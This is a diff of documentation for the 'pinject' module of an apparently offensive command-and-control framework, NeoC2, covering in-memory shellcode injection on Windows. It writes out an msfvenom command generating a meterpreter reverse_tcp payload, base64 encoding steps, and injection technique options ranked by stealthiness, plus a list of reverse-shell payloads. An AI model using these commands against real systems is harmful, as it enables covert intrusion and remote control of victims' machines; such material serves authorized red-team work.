@@ -179,16 +179,20 @@ This module interfaces with an active agent for In-memory shellcode injection in
 2. Convert the generated shelllcode to base64 string and save in a .b64 file
 3. Run the module using the .b64 file as input (shellcode_file)
 
-#### msfvenom Command Syntax
+#### Command Syntax
 Generate shellcode with proper null byte avoidance and correct format:
 
 ```
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f raw -o shellcode.bin
+modules info pinject
+# In interactive mode, the agent ID is automatically inferred:
+pinject <shellcode_file> [agent_id=<agent_id>] [technique=auto|apc|ntcreatethread|rtlcreateuser|createremote]
 
+# Example: Generate shellcode
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -f raw -o shellcode.bin
 # Base64 encode the raw shellcode and save to .b64 file before sending to the module - (preferred METHOD 1)
 base64 -w 0 shellcode.bin > shellcode.b64 
-NeoC2 (user@remote) > interact <agent_id>
-NeoC2 (user@remote)[INTERACTIVE] > pinject shellcode.b64
+
+pinject shellcode.b64 technique=auto
 ```
 
 #### Notes
@@ -235,7 +239,7 @@ The shellcode injection techniques are ordered by stealthiness:
 - windows/x64/meterpreter/reverse_tcp
 - windows/x64/shell_reverse_tcp
 - windows/x64/exec
-- Any custom raw shellcode
+- Small-sized custom raw shellcode
 
 
 ## PEInject
